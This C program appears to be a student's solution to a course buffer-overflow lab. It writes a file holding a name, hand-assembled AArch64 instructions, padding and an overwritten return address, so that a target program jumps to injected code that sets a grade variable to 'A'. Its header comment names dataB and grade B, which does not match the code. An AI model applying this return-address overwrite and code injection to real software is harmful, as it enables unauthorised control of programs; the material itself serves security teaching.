#include <stdio.h>
#include <string.h>
#include "miniassembler.h" 
/* creates file dataB with more than 48 bytes for the name. 
This overwrites the return address and changes it to the return
 address of the grade = B command */
 const unsigned int w0 = 0;
 const unsigned int x1 = 1;
int main() {
    FILE *psFile;
    int i = 0;
    unsigned long ul = 0x420068;
    unsigned int temp;
    unsigned long grade = 0x420044;
    unsigned long ulAddr = 0x400864;
    unsigned long ulAddrOfThisInstr = 0x420074;
    /* My name*/
    char* name = "Stephen Elliott";
    int a = (int) 'A';
    psFile = fopen("dataA", "w");
    /* writes my name to the file */
    fprintf(psFile, "%s", name);
    /* 0x420068 mov w0, 'A' */ 
    /* null byte for padding */
    putc('\0', psFile);
    
    /* moves A into register w0*/
    temp = MiniAssembler_mov(w0, a);
    fwrite(&temp, sizeof(unsigned int), 1, psFile);

    /* address of grade into register */
    temp = MiniAssembler_adr(x1, grade, 0x42006c);
    fwrite(&temp, sizeof(unsigned int), 1, psFile);

    /*stores the byte in w0 in x1 */
    temp =  MiniAssembler_strb(w0, x1);
    fwrite(&temp, sizeof(unsigned int), 1, psFile);

    /* branches to is your grade command */
    temp = MiniAssembler_b(ulAddr, ulAddrOfThisInstr);
    fwrite(&temp, sizeof(unsigned int), 1, psFile);
    
    /*fills remaining space with zeroes */
    for (i = 0; i < 16; i++){
       /* fprintf(psFile,  "%c", '\0'); */
       putc('\0', psFile);
    }
    /* address of end of my name and beginning of instructions */
    
    fwrite(&ul, sizeof(unsigned long), 1, psFile); 

    fclose(psFile);
    return 1;
}
